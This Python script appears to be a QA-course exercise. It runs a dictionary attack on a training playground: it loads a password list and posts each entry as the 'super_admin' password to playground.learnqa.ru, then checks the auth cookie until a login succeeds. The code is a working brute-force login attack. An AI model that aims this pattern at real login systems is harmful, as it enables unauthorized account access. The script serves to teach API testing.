import requests

password_list = []

#Create unique passwords list
for password in open("password_list.txt"):
    pas = password.rstrip("\n")
    if pas not in password_list:
        password_list.append(pas)

#Checking every password from the list till the right one is found
for pas in password_list:
    payloads = {"login": "super_admin", "password": pas}
    get_cookie_response = requests.post("https://playground.learnqa.ru/ajax/api/get_auth_cookie", data=payloads)
    cookie_value = get_cookie_response.cookies.get("auth_cookie")
    cookies = {"auth_cookie": cookie_value}
    check_cookie_response = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    if check_cookie_response.text != "You are NOT authorized":
        print(f'{check_cookie_response.text}! The correct password is: {pas}')
        break